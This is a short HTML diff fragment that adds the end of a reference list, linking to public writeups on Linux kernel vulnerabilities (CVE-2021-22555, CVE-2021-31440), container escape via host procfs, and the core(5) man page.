+<a href="https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell" target="_blank">https://github.com/google/security-research/blob/master/pocs/linux/cve-2021-22555/writeup.md#escaping-the-container-and-popping-a-root-shell</a><br/>
+<a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html" target="_blank">https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</a><br/>
+<a href="https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2021-31440" target="_blank">https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2021-31440</a><br/>
+<a href="https://man7.org/linux/man-pages/man5/core.5.html" target="_blank">https://man7.org/linux/man-pages/man5/core.5.html</a><br/>
+<a href="https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-host-procfs" target="_blank">https://github.com/Metarget/metarget/tree/master/writeups_cnv/mount-host-procfs</a></p>
+</div>
+</div>
